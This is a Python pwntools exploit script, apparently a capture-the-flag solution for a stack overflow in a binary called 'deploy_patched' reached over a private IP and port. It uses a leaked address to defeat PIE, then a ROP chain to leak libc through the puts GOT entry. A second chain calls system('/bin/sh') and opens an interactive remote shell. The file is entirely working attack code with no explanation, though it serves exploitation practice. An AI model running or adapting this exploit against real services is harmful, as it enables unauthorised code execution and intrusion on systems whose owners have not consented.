#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './deploy_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '10.1.2.227', 14132

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x1215
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    io.recvuntil(b'at: ')
    elf.address = int(io.recvline(), 16) - elf.sym['log_deployment']

    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    payload = flat({
        64+8: [
            ret,
            pop_rdi,
            elf.got['puts'],
            elf.plt['printf'],
            elf.sym['main'],
        ]
    })
    io.sendline(payload)

    io.recvlines(4)
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['puts']

    payload = flat({
        64+8: [
            pop_rdi,
            next(libc.search(b'/bin/sh')),
            libc.sym['system'],
        ]
    })
    io.sendline(payload)

    log.info("elf base: %#x", elf.address)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
